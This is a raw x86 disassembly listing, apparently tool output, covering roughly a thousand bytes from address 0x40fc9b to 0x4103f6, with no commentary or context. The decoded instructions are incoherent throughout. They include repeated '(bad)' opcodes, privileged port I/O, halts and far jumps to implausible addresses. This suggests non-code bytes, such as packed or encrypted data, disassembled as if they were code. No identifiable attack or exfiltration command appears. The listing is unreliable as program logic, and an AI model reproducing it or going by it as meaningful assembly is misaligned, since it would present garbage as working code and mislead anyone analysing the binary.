  40fc9b:	fisub  WORD PTR [ebp+edi*2-0x7b850915]
  40fca2:	push   ecx
  40fca3:	inc    esp
  40fca4:	mov    al,ds:0x1a27b453
  40fca9:	sbb    esp,esp
  40fcab:	in     eax,dx
  40fcac:	inc    edi
  40fcad:	out    dx,al
  40fcae:	clc    
  40fcaf:	sub    BYTE PTR [edx-0x5af0a2cb],dh
  40fcb5:	call   0xf3c6:0x15798059
  40fcbc:	cmp    al,0x56
  40fcbe:	push   edi
  40fcbf:	push   edi
  40fcc0:	pop    edi
  40fcc1:	aad    0x28
  40fcc3:	inc    eax
  40fcc4:	fadd   DWORD PTR ds:0xc0820803
  40fcca:	jmp    0xcd4c91ef
  40fccf:	pop    eax
  40fcd0:	std    
  40fcd1:	rcl    DWORD PTR [esi+0x3c210132],cl
  40fcd7:	ret    0xc870
  40fcda:	jo     0x40fcb4
  40fcdc:	(bad)  
  40fcdd:	aam    0x11
  40fcdf:	adc    BYTE PTR [ebp+eax*1-0x80],0x51
  40fce4:	std    
  40fce5:	outs   dx,DWORD PTR ds:[esi]
  40fce7:	shr    DWORD PTR [edi],1
  40fce9:	pop    edx
  40fcea:	lock fcomp QWORD PTR ss:[edi+ebx*2]
  40fcef:	lods   eax,DWORD PTR ds:[esi]
  40fcf0:	push   esi
  40fcf1:	cdq    
  40fcf2:	fwait
  40fcf3:	fwait
  40fcf4:	mov    bl,0xb1
  40fcf6:	imul   esi
  40fcf8:	mov    cl,0x9d
  40fcfa:	dec    esi
  40fcfb:	xchg   ebx,ecx
  40fcfd:	xchg   edi,eax
  40fcfe:	das    
  40fcff:	mov    bl,0xbd
  40fd01:	mov    ebp,0x3d92948d
  40fd06:	jnp    0x40fcfe
  40fd08:	fsubr  DWORD PTR [eax+0x3132373d]
  40fd0e:	or     al,0x43
  40fd10:	pop    esi
  40fd11:	jp     0x40fcfc
  40fd13:	and    eax,0x493c9e4e
  40fd18:	mov    bh,0xdb
  40fd1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd1b:	xlat   BYTE PTR ds:[ebx]
  40fd1c:	jmp    0x40fd43
  40fd1e:	push   edi
  40fd1f:	scas   al,BYTE PTR es:[edi]
  40fd20:	pop    esp
  40fd21:	jns    0x40fd11
  40fd23:	lds    edx,FWORD PTR [edi]
  40fd25:	pop    edi
  40fd26:	cld    
  40fd27:	loop   0x40fcc2
  40fd29:	xor    esp,DWORD PTR [edi-0x72]
  40fd2c:	(bad)  
  40fd2d:	jno    0x40fd4b
  40fd2f:	add    dh,dl
  40fd31:	les    ecx,FWORD PTR [ecx+0x42115f13]
  40fd37:	push   esp
  40fd38:	xchg   edi,eax
  40fd39:	xchg   esi,eax
  40fd3a:	xchg   esi,eax
  40fd3b:	push   cs
  40fd3c:	sbb    al,0x3c
  40fd3e:	js     0x40fd30
  40fd40:	jne    0x40fdb1
  40fd42:	jp     0x40fd17
  40fd44:	fwait
  40fd45:	mov    esi,0x43a1d0e5
  40fd4a:	push   ebx
  40fd4b:	mov    ch,0x5a
  40fd4d:	lea    esi,[ecx-0x6ad5ce4f]
  40fd53:	or     bh,BYTE PTR [ebp-0x3ca330a2]
  40fd59:	cs das 
  40fd5b:	sub    eax,0xc8fa1d2d
  40fd60:	inc    edi
  40fd61:	repnz xlat BYTE PTR ds:[ebx]
  40fd64:	jg     0x40fd48
  40fd66:	daa    
  40fd67:	jle    0x40fd4b
  40fd69:	xchg   ebx,esp
  40fd6b:	cmp    BYTE PTR [esi],dh
  40fd6d:	mov    eax,ds:0xa6faba65
  40fd72:	inc    ebp
  40fd73:	add    DWORD PTR [esi+0x67],ebp
  40fd76:	in     al,0x19
  40fd78:	sub    bh,0x2c
  40fd7b:	fwait
  40fd7c:	repnz ds out dx,al
  40fd7f:	(bad)  
  40fd80:	sbb    BYTE PTR [eax],bl
  40fd82:	jp     0x40fd22
  40fd84:	push   edi
  40fd85:	fwait
  40fd86:	popf   
  40fd87:	popf   
  40fd88:	popf   
  40fd89:	jle    0x40fd6e
  40fd8b:	sbb    ebx,edi
  40fd8d:	clc    
  40fd8e:	sar    BYTE PTR [ebx],1
  40fd90:	fdivrp st(1),st
  40fd92:	mov    ?,WORD PTR [edi+0x1d]
  40fd95:	ds jl  0x40fd90
  40fd98:	fwait
  40fd99:	dec    esp
  40fd9a:	xor    eax,0x53a74e9a
  40fd9f:	fsubr  DWORD PTR [edi+0x777c23d7]
  40fda5:	(bad)  
  40fda7:	sti    
  40fda8:	ret    0x2c2
  40fdab:	in     eax,0x72
  40fdad:	pop    ecx
  40fdae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdaf:	pop    ss
  40fdb0:	and    ecx,DWORD PTR ds:0x437fc9d0
  40fdb6:	mov    bl,0xec
  40fdb8:	dec    edx
  40fdb9:	retf   0x8a28
  40fdbc:	mov    eax,0xcb3cfe70
  40fdc1:	addr16 into 
  40fdc3:	and    BYTE PTR [eax+eiz*4+0x35332e5c],al
  40fdca:	xor    eax,0x8668cc5
  40fdcf:	pop    es
  40fdd0:	nop    DWORD PTR [esp+edi*2+0x62]
  40fdd5:	or     BYTE PTR [ecx],0x87
  40fdd8:	xchg   ecx,eax
  40fdd9:	ja     0xaf1eb822
  40fddf:	popf   
  40fde0:	xor    bl,BYTE PTR ds:0x91c21146
  40fde6:	in     al,0x9
  40fde8:	push   cs
  40fde9:	sub    dh,al
  40fdeb:	int3   
  40fdec:	sub    al,0x40
  40fdee:	lods   al,BYTE PTR ds:[esi]
  40fdef:	fisub  DWORD PTR [eax]
  40fdf1:	dec    eax
  40fdf2:	ins    DWORD PTR es:[edi],dx
  40fdf3:	add    al,0xa6
  40fdf5:	lock imul esp,DWORD PTR [edi+0x28f34edd],0xffffffc6
  40fdfd:	mov    cl,0x99
  40fdff:	mov    ds:0x36946851,eax
  40fe04:	out    dx,eax
  40fe05:	jne    0x40fe34
  40fe07:	xor    DWORD PTR [ebx-0x2f],0x3e
  40fe0b:	repz jmp 0x40fe40
  40fe0e:	add    bh,dh
  40fe10:	mov    bh,0x54
  40fe12:	sub    bh,BYTE PTR [ebp+0x4d40c96a]
  40fe18:	mov    ebx,0xf1700661
  40fe1d:	loop   0x40fde4
  40fe1f:	sub    ecx,DWORD PTR [ebx+0x4a7a8b8b]
  40fe25:	stos   DWORD PTR es:[edi],eax
  40fe26:	push   edx
  40fe27:	add    DWORD PTR [edi+eiz*1+0x1c54bcc0],ecx
  40fe2e:	dec    ebx
  40fe2f:	sbb    eax,0xba3aa418
  40fe34:	shr    DWORD PTR [ecx-0x27],cl
  40fe37:	fdiv   DWORD PTR [ebx-0x6d]
  40fe3a:	sbb    BYTE PTR [ebx],ah
  40fe3c:	outs   dx,DWORD PTR ds:[esi]
  40fe3d:	add    al,0x74
  40fe3f:	fcomi  st,st(5)
  40fe41:	fadd   QWORD PTR [eax+0x691ab066]
  40fe47:	pop    ebx
  40fe48:	stos   DWORD PTR es:[edi],eax
  40fe49:	aad    0x32
  40fe4b:	push   eax
  40fe4c:	fisttp WORD PTR [eax-0x70]
  40fe4f:	sub    eax,0xbd7a503d
  40fe54:	push   ds
  40fe55:	cmc    
  40fe56:	jp     0x40fdf5
  40fe58:	add    eax,DWORD PTR [edi]
  40fe5a:	push   cs
  40fe5b:	shr    BYTE PTR [esi+esi*1+0x2d],1
  40fe5f:	xchg   ebx,eax
  40fe60:	xor    cl,bh
  40fe62:	fst    DWORD PTR [edi+0x59599797]
  40fe68:	pop    ecx
  40fe69:	popa   
  40fe6a:	ins    DWORD PTR es:[edi],dx
  40fe6b:	ins    DWORD PTR es:[edi],dx
  40fe6c:	lea    ecx,[ebp-0x4949f273]
  40fe72:	mov    dh,0xce
  40fe74:	lahf   
  40fe75:	ds jge 0x40fe72
  40fe78:	mov    DWORD PTR [ebx-0x69],ecx
  40fe7b:	cs popf 
  40fe7d:	pop    eax
  40fe7e:	pop    ecx
  40fe7f:	pop    ecx
  40fe80:	jns    0x40fea7
  40fe82:	dec    ecx
  40fe83:	xchg   edx,eax
  40fe84:	or     BYTE PTR ds:0x82284bdb,al
  40fe8a:	in     eax,dx
  40fe8b:	out    dx,eax
  40fe8c:	fistp  QWORD PTR [edi-0x10421e81]
  40fe92:	jge    0x40fe83
  40fe94:	fwait
  40fe95:	out    dx,al
  40fe96:	mov    ecx,0x87839ee7
  40fe9b:	nop    DWORD PTR [esi-0x46]
  40fe9f:	xor    edi,esi
  40fea1:	ss ss ss adc al,0x8c
  40fea6:	aad    0x70
  40fea8:	push   esi
  40fea9:	inc    edi
  40feaa:	add    dh,BYTE PTR [esi-0x61]
  40fead:	jns    0x40fe95
  40feaf:	cdq    
  40feb0:	inc    edi
  40feb1:	sahf   
  40feb2:	jge    0x40feaa
  40feb4:	fnstcw WORD PTR [edi]
  40feb6:	aad    0x83
  40feb8:	ret    0xfe48
  40febb:	or     BYTE PTR [ebp-0x78],ch
  40febe:	arpl   WORD PTR [ebp+ebx*1+0x70],dx
  40fec2:	mov    ebx,ebx
  40fec4:	xor    BYTE PTR [eax],al
  40fec6:	ja     0x40fea1
  40fec8:	inc    ebp
  40fec9:	add    al,0x83
  40fecb:	stc    
  40fecc:	stc    
  40fecd:	stc    
  40fece:	stc    
  40fecf:	xchg   DWORD PTR [edi],ebx
  40fed1:	jle    0x40fecb
  40fed3:	fistp  DWORD PTR [edi]
  40fed5:	js     0x40feb7
  40fed7:	xor    DWORD PTR [edi-0xf87c3e4],0xc9c9c9ae
  40fee1:	icebp  
  40fee2:	cmp    al,0xd1
  40fee4:	out    0x9,eax
  40fee6:	jge    0x40ff0f
  40fee8:	push   ax
  40feea:	mov    ah,0x2d
  40feec:	outs   dx,DWORD PTR ds:[esi]
  40feed:	adc    DWORD PTR [bp+si-0x28],eax
  40fef1:	push   0x231d0dc9
  40fef6:	push   eax
  40fef7:	mov    ebp,DWORD PTR fs:[ecx]
  40fefa:	(bad)  
  40fefb:	fiadd  WORD PTR [esi]
  40fefd:	cmp    bl,BYTE PTR [ebx+0x1c71b90c]
  40ff03:	jae    0x40fefe
  40ff05:	repnz gs into 
  40ff08:	popf   
  40ff09:	push   ebx
  40ff0a:	dec    ecx
  40ff0b:	jno    0x40fed7
  40ff0d:	in     eax,0x32
  40ff0f:	aad    0x6a
  40ff11:	aad    0xda
  40ff13:	jo     0x40fea1
  40ff15:	retf   
  40ff16:	jbe    0x40ff86
  40ff18:	jle    0x40fef8
  40ff1a:	xor    bl,BYTE PTR [esi]
  40ff1c:	push   ebx
  40ff1d:	fisubr WORD PTR [ebp+0xd13efd7]
  40ff23:	xchg   DWORD PTR [edx+eax*8],ecx
  40ff26:	nop
  40ff27:	scas   al,BYTE PTR es:[edi]
  40ff28:	mov    dh,0x2b
  40ff2a:	and    al,0x52
  40ff2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff2d:	dec    edi
  40ff2e:	aaa    
  40ff2f:	cmc    
  40ff30:	pop    ss
  40ff31:	xor    al,0xc
  40ff33:	add    eax,0x63fd1cd2
  40ff38:	arpl   WORD PTR [ebx+0x24],sp
  40ff3b:	push   es
  40ff3c:	ins    DWORD PTR es:[edi],dx
  40ff3d:	mov    ah,0xdb
  40ff3f:	ss pop ebp
  40ff41:	ja     0x40fee8
  40ff43:	push   edx
  40ff44:	sbb    DWORD PTR [ecx-0x62],eax
  40ff47:	outs   dx,BYTE PTR ds:[esi]
  40ff48:	pop    edi
  40ff49:	fmul   QWORD PTR [ebx+edx*1]
  40ff4c:	jo     0x40ff79
  40ff4e:	pop    edx
  40ff4f:	cdq    
  40ff50:	imul   edx,DWORD PTR [ebx+ecx*8-0x3162c59b],0xffffffd5
  40ff58:	out    0x9e,eax
  40ff5a:	jnp    0x40ff4a
  40ff5c:	or     DWORD PTR [edx-0x212423ba],esi
  40ff62:	jbe    0x40ff27
  40ff64:	add    BYTE PTR [esi],al
  40ff66:	pop    es
  40ff67:	push   cs
  40ff68:	sbb    al,0x60
  40ff6a:	xor    BYTE PTR [eax],bl
  40ff6c:	call   0x494a4745
  40ff71:	adc    ah,BYTE PTR [ebp+0x6c]
  40ff74:	add    dh,al
  40ff76:	xor    esp,DWORD PTR [eax-0x58218d4]
  40ff7c:	std    
  40ff7d:	push   ds
  40ff7e:	(bad)  
  40ff7f:	push   ds
  40ff80:	and    BYTE PTR [eax+eiz*2+0x175e1c38],al
  40ff87:	(bad)  
  40ff88:	out    dx,eax
  40ff89:	fs in  al,0x4b
  40ff8c:	xchg   edx,eax
  40ff8d:	test   BYTE PTR [edx-0x47],dh
  40ff90:	int3   
  40ff91:	clc    
  40ff92:	clc    
  40ff93:	cmp    bl,dl
  40ff95:	rcl    ebx,cl
  40ff97:	jbe    0x40ff23
  40ff99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff9a:	cmp    DWORD PTR [esi+0x38],esi
  40ff9d:	sbb    al,0xb2
  40ff9f:	mov    ch,0xb5
  40ffa1:	gs inc ebx
  40ffa3:	jo     0x40ff32
  40ffa5:	xchg   ebp,eax
  40ffa6:	jp     0x410016
  40ffa8:	outs   dx,BYTE PTR ds:[esi]
  40ffa9:	into   
  40ffaa:	push   es
  40ffab:	lods   al,BYTE PTR ds:[esi]
  40ffac:	cwde   
  40ffad:	jmp    0x5d6f977a
  40ffb2:	loop   0x40ff49
  40ffb4:	push   edi
  40ffb5:	pop    esi
  40ffb6:	popa   
  40ffb7:	jns    0x410032
  40ffb9:	fldenv [ecx*8+0x71389eec]
  40ffc0:	loop   0x40ff51
  40ffc2:	mov    ds,WORD PTR [edi]
  40ffc4:	aas    
  40ffc5:	(bad)  
  40ffc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffc7:	pop    esi
  40ffc8:	scas   eax,DWORD PTR es:[edi]
  40ffc9:	xlat   BYTE PTR ds:[ebx]
  40ffca:	sar    ch,cl
  40ffcc:	push   edx
  40ffcd:	sar    BYTE PTR [edi+0x9],cl
  40ffd0:	xor    BYTE PTR [edi+ebx*4-0x30866061],bl
  40ffd7:	jnp    0x40ffb7
  40ffd9:	repz lock mov ebx,0xb7eefddf
  40ffe0:	out    dx,eax
  40ffe1:	(bad)  [edi+0x2082c6f]
  40ffe7:	retf   0x10ba
  40ffea:	call   0x63a1304f
  40ffef:	arpl   WORD PTR [ebx-0x66944892],ax
  40fff5:	dec    edi
  40fff6:	adc    al,0x45
  40fff8:	cmp    al,0xf1
  40fffa:	les    edx,FWORD PTR [ebx]
  40fffc:	pop    edi
  40fffd:	clc    
  40fffe:	cld    
  40ffff:	out    0x3f,eax
  410001:	(bad)  
  410002:	jmp    0x40ffeb
  410004:	into   
  410005:	popf   
  410006:	cmp    eax,DWORD PTR [ebp+0x451f7a22]
  41000c:	clc    
  41000d:	adc    DWORD PTR [edx-0xa],ebp
  410010:	mov    DWORD PTR [ecx+0x1],eax
  410013:	adc    DWORD PTR [ebx],edi
  410015:	xor    eax,DWORD PTR [eax-0xa640ec4]
  41001b:	inc    ecx
  41001c:	mov    bl,0xd9
  41001e:	ins    BYTE PTR es:[edi],dx
  41001f:	jle    0x410009
  410021:	inc    ebx
  410022:	pop    ds
  410023:	cli    
  410024:	sahf   
  410025:	ja     0x40ffe5
  410027:	repz popf 
  410029:	pop    ds
  41002a:	call   0x69d4:0x37d99999
  410031:	leave  
  410032:	(bad)  
  410034:	jbe    0x40ffbc
  410036:	or     bl,dh
  410038:	add    al,0x79
  41003a:	mov    ds:0x3e5a6fc4,eax
  41003f:	xchg   ebp,eax
  410040:	mov    ch,0xab
  410042:	jbe    0x41005d
  410044:	jne    0x410006
  410046:	sub    eax,0x65ee6178
  41004b:	pop    esp
  41004c:	ret    0x22e
  41004f:	xor    bh,bl
  410051:	sub    al,0x9f
  410053:	hlt    
  410054:	aad    0xcc
  410056:	pushf  
  410057:	mov    ebx,fs
  410059:	fmul   st,st(6)
  41005b:	scas   al,BYTE PTR es:[edi]
  41005c:	je     0x40ffe3
  41005e:	inc    ebp
  41005f:	test   eax,0x62626254
  410064:	cmp    cl,0xf9
  410067:	jns    0x4100cf
  410069:	addr16 addr16 pop ecx
  41006c:	pop    esp
  41006d:	pop    esp
  41006e:	fistp  QWORD PTR fs:[esi+0x4c4c4c7d]
  410075:	push   eax
  410076:	sub    dl,BYTE PTR [ebp-0x1e0885ac]
  41007c:	shl    BYTE PTR [esi+0x5b],1
  41007f:	jmp    0xc37d:0xb50cbb74
  410086:	jp     0x4100a7
  410088:	hlt    
  410089:	jge    0x410052
  41008b:	mov    bh,0xed
  41008e:	jnp    0x410078
  410090:	test   al,0x4d
  410092:	xchg   ebp,eax
  410093:	fmulp  st(5),st
  410095:	mov    esi,ebp
  410097:	fmul   QWORD PTR [ecx-0x5e]
  41009a:	out    dx,eax
  41009b:	xchg   esi,eax
  41009c:	or     esp,esp
  41009e:	fucom  st(2)
  4100a0:	xchg   ebp,eax
  4100a1:	dec    edx
  4100a2:	test   DWORD PTR [edx-0x5b],ecx
  4100a5:	ret    0xf2f2
  4100a8:	bnd jg 0x410128
  4100ab:	jmp    0x906f9855
  4100b0:	inc    esi
  4100b1:	jno    0x41004d
  4100b3:	mov    edi,0x6e39629d
  4100b8:	dec    ecx
  4100b9:	mov    ebx,0xfbe00661
  4100be:	mov    esi,0xce52d807
  4100c3:	jno    0x410131
  4100c5:	ret    0xb381
  4100c8:	sub    al,BYTE PTR [eax-0x16dff656]
  4100ce:	jbe    0x4100ab
  4100d0:	cmp    dh,BYTE PTR [edi+0x59d2345c]
  4100d6:	inc    ebp
  4100d7:	adc    bl,dl
  4100d9:	inc    ebp
  4100da:	add    al,0xf9
  4100dc:	add    DWORD PTR [ebx],ebx
  4100de:	add    al,0x81
  4100e0:	popf   
  4100e1:	xchg   edi,ebp
  4100e3:	(bad)  
  4100e4:	adc    ebx,DWORD PTR [eax]
  4100e6:	and    edx,esi
  4100e8:	cli    
  4100e9:	cli    
  4100ea:	cmp    bl,BYTE PTR [ebx]
  4100ec:	sbb    ebx,DWORD PTR [ebx]
  4100ee:	or     al,0x6
  4100f0:	add    eax,esi
  4100f2:	mov    dh,0xd8
  4100f5:	mov    bh,0x6f
  4100f7:	pop    ds
  4100f8:	push   ebx
  4100f9:	push   ebx
  4100fa:	push   ebx
  4100fb:	xchg   esi,eax
  4100fc:	mov    ds:0xfe76c19b,eax
  410101:	cld    
  410102:	jns    0x410162
  410104:	jns    0x4100eb
  410106:	adc    eax,0x8c565656
  41010b:	jno    0x4100bc
  41010d:	jnp    0x4100fd
  41010f:	fdivr  QWORD PTR [ecx-0xd034251]
  410115:	retf   
  410116:	pop    edi
  410117:	pop    esp
  410118:	pop    ebp
  410119:	pop    ebp
  41011a:	mov    ebp,0x26f82280
  41011f:	jmp    0xf95d:0x58284423
  410126:	rol    BYTE PTR [edi],0x3e
  410129:	lock mov esi,0xfdffbff7
  41012f:	out    dx,eax
  410130:	pop    ecx
  410131:	pop    eax
  410132:	pop    eax
  410133:	cwde   
  410134:	sub    BYTE PTR [edi+0x356ad4cb],dl
  41013a:	fwait
  41013b:	xchg   edi,eax
  41013c:	jg     0x4101b9
  41013e:	jnp    0x41011b
  410140:	mov    ds:0x6deded8d,al
  410145:	pop    edx
  410146:	lods   eax,DWORD PTR ds:[esi]
  410147:	push   ss
  410148:	pop    ss
  410149:	cs pop esp
  41014b:	js     0x410136
  41014d:	sub    ebx,DWORD PTR [edi-0x7]
  410150:	retf   0x3c1f
  410153:	cli    
  410154:	call   0xa4e190fc
  410159:	jl     0x4101a0
  41015b:	call   FWORD PTR [edx]
  41015d:	mov    ds:0x2dbfb5d7,al
  410162:	xor    esi,DWORD PTR [eax]
  410164:	test   al,0xc0
  410166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410167:	xor    al,0x83
  410169:	pop    esi
  41016a:	pop    ebp
  41016b:	mov    ds:0xc435f4f7,al
  410170:	inc    ebx
  410171:	(bad)  
  410173:	hlt    
  410174:	loopne 0x4100fd
  410176:	aas    
  410177:	cld    
  410178:	loope  0x410139
  41017a:	jno    0x41016b
  41017c:	mov    ebp,0xd7b9bef7
  410181:	jmp    0x41015c
  410183:	fs stos DWORD PTR es:[edi],eax
  410185:	outs   dx,BYTE PTR ds:[esi]
  410186:	mov    edi,0xaeaf13b9
  41018b:	add    eax,0x4c7aff3
  410190:	repnz (bad) 
  410193:	mov    ebp,0x4cfbefa6
  410198:	dec    ebp
  410199:	dec    ebp
  41019a:	mov    cl,0xbd
  41019c:	mov    ebp,0x79a58d6d
  4101a1:	call   0xe1a0a15
  4101a6:	add    al,0x73
  4101a8:	jg     0x4101d7
  4101aa:	jl     0x410223
  4101ac:	lods   al,BYTE PTR ds:[esi]
  4101ad:	in     eax,dx
  4101ae:	stc    
  4101af:	pop    esp
  4101b0:	or     edx,DWORD PTR [edx+0x4a]
  4101b3:	ss ss ss pop eax
  4101b7:	pop    ebp
  4101b8:	pop    ebp
  4101b9:	inc    ebp
  4101ba:	dec    edx
  4101bb:	xchg   ebp,eax
  4101bc:	outs   dx,BYTE PTR ds:[esi]
  4101bd:	int    0x44
  4101bf:	jb     0x4101af
  4101c1:	fnstsw WORD PTR [ebx-0x8040269]
  4101c7:	mov    bl,0xb0
  4101c9:	mov    al,0x40
  4101cb:	mov    ds:0x6a6a60d1,eax
  4101d0:	or     ch,BYTE PTR [ecx]
  4101d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101d3:	dec    ebp
  4101d4:	mov    edi,0xd7e9d1d6
  4101d9:	push   es
  4101da:	cmp    al,BYTE PTR [edi+0x60f79982]
  4101e0:	out    dx,al
  4101e1:	scas   al,BYTE PTR es:[di]
  4101e3:	in     eax,0x32
  4101e5:	sbb    al,0x77
  4101e7:	mov    ebp,fs
  4101e9:	sti    
  4101ea:	popa   
  4101eb:	aaa    
  4101ec:	dec    esp
  4101ed:	sar    BYTE PTR [eax-0x72],0xc
  4101f1:	jb     0x4101a0
  4101f3:	xlat   BYTE PTR ds:[ebx]
  4101f4:	jmp    0x4101fa
  4101f6:	inc    ecx
  4101f7:	rcr    BYTE PTR [edi-0x3603604],0x91
  4101fe:	jle    0x4101bf
  410200:	sub    BYTE PTR [ecx+eiz*2-0x191dca28],0x3b
  410208:	(bad)  
  410209:	sbb    ecx,esi
  41020b:	or     al,0x76
  41020d:	arpl   WORD PTR [esp+ebx*2],ax
  410210:	aaa    
  410211:	das    
  410212:	ds sbb ah,dh
  410215:	xchg   ecx,eax
  410216:	xor    cl,ch
  410218:	or     BYTE PTR [ebx],0xa9
  41021b:	sbb    edx,DWORD PTR [eax-0x3f]
  41021e:	lock push cs
  410220:	add    DWORD PTR [ecx+0xf],0x69
  410224:	jmp    0x410200
  410226:	stos   DWORD PTR es:[edi],eax
  410227:	data16 adc ch,BYTE PTR [edx-0x66]
  41022b:	jecxz  0x410209
  41022d:	mov    cs,esp
  41022f:	ja     0x4101d1
  410231:	out    dx,eax
  410232:	sti    
  410233:	aam    0x6a
  410235:	xor    eax,0xb6cca6aa
  41023a:	jbe    0x410221
  41023c:	cdq    
  41023d:	(bad)  
  41023e:	aam    0xed
  410240:	jbe    0x41022b
  410242:	idiv   ebx
  410244:	ins    BYTE PTR es:[edi],dx
  410245:	outs   dx,BYTE PTR ds:[esi]
  410246:	outs   dx,BYTE PTR ds:[esi]
  410247:	adc    al,BYTE PTR [ebp+0x11]
  41024a:	cmc    
  41024b:	jp     0x4101ea
  41024d:	cdq    
  41024e:	cdq    
  41024f:	sbb    ebx,ebp
  410251:	retf   0xad33
  410254:	(bad)  [esi-0x4d]
  410257:	mov    cl,0xb1
  410259:	shl    ebp,0xcb
  41025c:	xchg   edi,eax
  41025d:	cmp    DWORD PTR [ebx-0x1a],esi
  410260:	or     al,0xdd
  410262:	outs   dx,BYTE PTR ds:[esi]
  410263:	push   edi
  410264:	outs   dx,BYTE PTR ds:[esi]
  410265:	outs   dx,DWORD PTR ds:[esi]
  410266:	outs   dx,DWORD PTR ds:[esi]
  410267:	pop    edi
  410268:	mov    esi,0xcbf2f97c
  41026d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41026e:	dec    esi
  41026f:	popf   
  410270:	cli    
  410271:	rcr    dl,cl
  410273:	fcmovu st,st(2)
  410275:	and    eax,0x5f196114
  41027a:	popa   
  41027b:	add    al,0x24
  41027d:	pop    es
  41027e:	nop    esp
  410281:	jg     0x410267
  410283:	enter  0x8391,0x6f
  410287:	jge    0x410274
  410289:	pop    ebx
  41028a:	pop    edi
  41028b:	jmp    eax
  41028d:	or     DWORD PTR [edi],0xffffffde
  410290:	imul   esp,DWORD PTR [eax-0x42],0x21
  410294:	jl     0x410299
  410296:	cmc    
  410297:	aaa    
  410298:	aaa    
  410299:	aaa    
  41029a:	jmp    0xafed7d94
  41029f:	scas   eax,DWORD PTR es:[edi]
  4102a0:	inc    edi
  4102a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102a2:	dec    edi
  4102a3:	lahf   
  4102a4:	jle    0x41028f
  4102a6:	mov    ecx,0xe47b9ee7
  4102ab:	icebp  
  4102ac:	(bad)  
  4102ad:	pop    ds
  4102ae:	call   DWORD PTR [edx+0x18]
  4102b1:	xchg   BYTE PTR [ebp-0x23],ch
  4102b4:	mov    edi,0x94436886
  4102b9:	push   ebp
  4102ba:	ds jb  0x410253
  4102bd:	inc    ebx
  4102be:	push   edx
  4102bf:	add    al,0x90
  4102c1:	aaa    
  4102c2:	or     dh,ah
  4102c4:	push   ebp
  4102c5:	sbb    BYTE PTR [eax+0x6fbdbfff],0x8f
  4102cc:	xchg   ecx,eax
  4102cd:	mov    ds:0x55fcf73a,eax
  4102d2:	cmc    
  4102d3:	mov    ebx,0xe5e7bba7
  4102d8:	sbb    DWORD PTR [ebx+0x6c],edi
  4102db:	cmp    al,0xbe
  4102dd:	mov    dh,0x31
  4102df:	ss fsub st,st(6)
  4102e2:	jno    0x41027b
  4102e4:	cwde   
  4102e5:	inc    eax
  4102e6:	add    al,BYTE PTR [ecx-0x4b767ca0]
  4102ec:	and    DWORD PTR [ecx+0x50],edx
  4102ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102f0:	(bad)  
  4102f2:	pop    ds
  4102f3:	push   edi
  4102f4:	mov    ecx,0xae89bdd2
  4102f9:	push   esi
  4102fa:	dec    edx
  4102fb:	push   esi
  4102fc:	and    BYTE PTR [ecx],dl
  4102fe:	push   esi
  4102ff:	pop    ecx
  410300:	loopne 0x4102c8
  410302:	and    BYTE PTR [ecx-0x5bb269d5],ah
  410308:	fwait
  410309:	aad    0xe6
  41030b:	inc    esi
  41030c:	mov    al,BYTE PTR [edx-0x30]
  41030f:	pop    ebp
  410310:	imul   edx,DWORD PTR ds:0x4c20d864,0x836c4dae
  41031a:	jns    0x4102e0
  41031c:	das    
  41031d:	int3   
  41031e:	loopne 0x4102f8
  410320:	jecxz  0x41033b
  410322:	jnp    0x410382
  410324:	fnstsw WORD PTR ds:0xeee9eeaf
  41032a:	jno    0x4103a3
  41032c:	cmc    
  41032d:	mov    ds:0xff7aabba,eax
  410332:	call   0x3f00ae35
  410337:	jae    0x4102e3
  410339:	jnp    0x410301
  41033b:	fadd   DWORD PTR [eax+edx*4-0x515ab606]
  410342:	(bad)  
  410343:	test   eax,0xf5d553aa
  410348:	std    
  410349:	mov    esi,0x39cef9c7
  41034e:	xor    BYTE PTR [ecx+0x7baed76b],0xee
  410355:	mov    ebp,0x7c6fdef7
  41035a:	icebp  
  41035b:	mov    ebx,DWORD PTR [edi-0x4]
  41035e:	add    BYTE PTR es:[edi-0x6dba0fb4],ch
  410365:	xchg   ebp,eax
  410366:	mov    ecx,0x9b0fb255
  41036b:	scas   eax,DWORD PTR es:[edi]
  41036c:	mov    bh,0x72
  41036e:	add    eax,edi
  410370:	xor    eax,0x870ffcc8
  410375:	ret    
  410376:	(bad)  
  410377:	jbe    0x41032e
  410379:	pop    edx
  41037a:	mov    ch,0xbe
  41037c:	or     eax,0x8517711e
  410381:	sahf   
  410382:	scas   al,BYTE PTR es:[edi]
  410383:	inc    ecx
  410384:	mov    edi,DWORD PTR [eax+0x4c]
  410387:	lods   al,BYTE PTR ds:[esi]
  410388:	das    
  410389:	lea    esp,[esi-0x1a370ab4]
  41038f:	jb     0x4103e9
  410391:	pop    esp
  410392:	pop    esp
  410393:	les    esp,FWORD PTR [ebp-0x76ef68b5]
  410399:	inc    esp
  41039a:	adc    BYTE PTR [esi+eax*1],cl
  41039d:	rcl    ebp,1
  41039f:	aad    0x85
  4103a1:	aad    0xab
  4103a3:	push   edi
  4103a4:	mov    ds:0x12c7a7a7,eax
  4103a9:	mov    eax,0xce822448
  4103ae:	into   
  4103af:	dec    esi
  4103b0:	mov    edx,DWORD PTR [eax+ecx*8+0x3d]
  4103b4:	mov    ds:0xc5312584,eax
  4103b9:	cdq    
  4103ba:	xlat   BYTE PTR ds:[ebx]
  4103bb:	jmp    0xabc19453
  4103c0:	or     DWORD PTR ds:[ebx],0xc130e0d
  4103c7:	push   es
  4103c8:	mov    eax,ds:0xc7c60a28
  4103cd:	mov    DWORD PTR [edi-0x42108422],0x78da883
  4103d7:	inc    ecx
  4103d8:	inc    ecx
  4103d9:	popa   
  4103da:	rol    DWORD PTR [edx],1
  4103dc:	xor    BYTE PTR ds:0xb85ddcdb,ah
  4103e2:	sub    ah,BYTE PTR [eax+esi*4+0x12]
  4103e6:	add    dl,al
  4103e8:	call   0x9da6cf8e
  4103ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103ee:	add    edi,edx
  4103f0:	or     BYTE PTR ds:[edx+0x45],0x87
  4103f5:	popa   
  4103f6:	push   esp
